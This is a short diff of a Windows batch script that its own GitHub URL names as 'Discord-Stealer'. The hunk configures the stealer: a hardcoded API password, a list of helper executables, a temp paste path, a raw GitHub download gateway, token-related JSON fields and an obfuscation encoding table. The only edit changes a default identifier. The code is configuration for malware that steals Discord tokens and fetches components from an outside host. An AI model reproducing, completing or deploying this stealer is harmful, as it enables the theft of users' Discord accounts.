@@ -7,7 +7,7 @@ set "APIPasswords=V4KG2CPM-QXWU4PM2"
 set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe rentry.exe nonAscii.exe
 set "pasteLocation=%temp%\DAS v!Version!\WebPaste.txt"
 set DefaultGateway=https://github.com/agamsol/Discord-Stealer/raw/main/
-set "DefaultIdentifier=B2Z9A-Z31RJ"
+set "DefaultIdentifier=10000-00000"
 set "JsonValues=token version CreationDate Enabled author.ID author.Endpoint author.Access"
 set "EncodeLength=4"
 set "ENCODE.LOWER[/]=djFW" & set "DECODE.LOWER[djFW]=/"
